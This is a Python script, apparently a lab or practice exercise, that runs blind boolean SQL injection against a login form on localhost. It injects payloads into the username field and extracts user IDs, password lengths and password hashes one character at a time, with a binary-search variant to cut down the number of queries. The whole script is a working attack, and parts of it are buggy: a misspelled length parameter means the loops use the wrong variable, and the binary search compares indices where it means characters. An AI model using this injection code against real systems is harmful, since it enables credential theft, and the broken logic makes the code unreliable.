# WHAT IF WE HAVE A LIMIT TO HOW MUCH QUERIES WE CAN DO? --> BINARY SEARCH

import requests

total_queries = 0
charset = "0123456789abcdef"
target = "http://127.0.0.1:5000"
needle = "Welcome back"

def injection_query(payload): # performe injected queries and check in the response if the request was valid or invalid
    global total_queries
    r = requests.post(target, data = {"username" : "admin' and {}--".format(payload), "password":"password"})
    total_queries += 1
    return needle.encode() not in r.content

def boolean_query(offset, user_id, character, operator=">"): # identify in a give offset if a caracter is valid or invalid
    payload = "(select hex(substr(password,{},1)) from user where id = {}) {} hex('{}')".format(offset+1, user_id, operator, character)
    return injection_query(payload)

def invalid_user(user_id): # identify if a user id is valid
    payload = "(select id from user where id = {}) >= 0".format(user_id)
    return injection_query(payload)

def password_length(user_id): # identify the length of a user password
    i = 0
    while True:
        payload = "(select length(password) from user where id = {} and length(password) <= {} limit 1)".format(user_id, i)
        if not injection_query(payload):
            return i
        i += 1

def extract_hash(charset, user_id, password_lenght):
    found = ""
    for i in range(0, password_length): # iterating over the length of the password of the user
        for j in range(len(charset)): # iterating over each caracter inside the charset variable
            if boolean_query(i, user_id, charset[j]): # if the password caracter match the charset one the we found one correct caracter
                found += charset[j] # appending the founded caracter to the string found
                break # stop the loop since we can pass to the next i
    return found

# Using binary search
def extract_hash_bst(charset, user_id, password_lenght):
    found = ""
    for index in range(0, password_length):
        start = 0
        end = len(charset) - 1
        while start <= end: # checking if we still have a middle 
            if end - start == 1: 
                if start == 0 and boolean_query(index, user_id, charset[start]):
                    found += charset[start]
                else:
                    found += charset[start+1]
                break
            else:
                middle = (start + end) // 2
                if boolean_query(index, user_id, middle):
                    end = middle
                else:
                    start = middle
    return found

def total_queries_taken():
    global total_queries
    print("\t\t[!] {} total queries!".format(total_queries))
    total_queries = 0


while True:
    try:
        user_id = input("> Enter a user ID to extract the password hash: ")
        if not invalid_user(user_id):
            user_password_length = password_length(user_id)
            print("\t[-] User {} hash length: {}".format(user_id, user_password_length))
            total_queries_taken()

            # Normal extraction
            print("\t[-] User {} hash: {}".format(user_id, extract_hash(charset, int(user_id), user_password_length)))
            total_queries_taken()

            # Binary search extraction
            print("\t[-] User {} hash: {}".format(user_id, extract_hash_bst(charset, int(user_id), user_password_length)))
            total_queries_taken()
        else:
            print("\t[X] User {} does not exists!".format(user_id))
    except KeyboardInterrupt:
        break